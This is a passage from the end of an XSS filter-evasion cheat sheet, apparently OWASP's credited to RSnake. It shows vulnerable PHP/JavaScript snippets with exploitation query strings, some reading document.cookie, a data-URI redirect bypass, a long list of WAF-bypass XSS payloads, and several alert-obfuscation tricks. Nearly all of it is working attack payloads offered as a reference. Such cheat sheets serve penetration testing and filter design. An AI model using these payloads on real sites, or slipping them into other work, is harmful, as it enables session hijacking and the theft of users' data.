<p>If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.</p>
<p>• Reflected XSS in Javascript</p>
<pre><code>Example: &lt;script&gt; ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... &lt;/script&gt;
Exploitation: /?xss=500); alert(document.cookie);//
</code></pre>
<p>• DOM-based XSS</p>
<pre><code>Example: &lt;script&gt; ... eval($\_GET\[xss\]); ... &lt;/script&gt;
Exploitation: /?xss=document.cookie
</code></pre>
<p>XSS via request Redirection.<br>
• Vulnerable code:</p>
<pre><code>...
header('Location: '.$_GET['param']);
...
</code></pre>
<p>As well as:</p>
<pre><code>...
header('Refresh: 0; URL='.$_GET['param']); 
...
</code></pre>
<p>• This request will not pass through the WAF:</p>
<pre><code>/?param=&lt;javascript:alert(document.cookie&gt;)
</code></pre>
<p>• This request will pass through the WAF and an XSS attack will be
conducted in certain browsers.</p>
<pre><code>/?param=&lt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
</code></pre>
<h2><a id="user-content-waf-bypass-strings-for-xss" class="anchor" aria-hidden="true" href="#waf-bypass-strings-for-xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>WAF ByPass Strings for XSS.</h2>
<pre><code>&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;
&lt;Video&gt; &lt;source onerror = "javascript: alert (XSS)"&gt;
&lt;Input value = "XSS" type = text&gt;
&lt;applet code="javascript:confirm(document.cookie);"&gt;
&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;
"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;
"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;
&lt;object data="javascript:alert(XSS)"&gt;
&lt;isindex type=image src=1 onerror=alert(XSS)&gt;
&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;
&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;
&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;
&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;
&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script
&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;
&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;
&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X
&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;
&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt; 
On Mouse Over​
&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe
&lt;script x&gt; alert(1) &lt;/script 1=2
&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME
&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"
&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;
&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt; 
</code></pre>
<h2><a id="user-content-filter-bypass-alert-obfuscation" class="anchor" aria-hidden="true" href="#filter-bypass-alert-obfuscation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Filter Bypass Alert Obfuscation</h2>
<pre><code>(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
</code></pre>
<h1><a id="user-content-authors-and-primary-editors" class="anchor" aria-hidden="true" href="#authors-and-primary-editors"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Authors and Primary Editors</h1>
<p>Robert "RSnake" Hansen</p>
<h1><a id="user-content-contributors" class="anchor" aria-hidden="true" href="#contributors"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Contributors</h1>
<p>Adam Lange<br>
Mishra Dhiraj</p>
</article>
  

  </body>
</html>

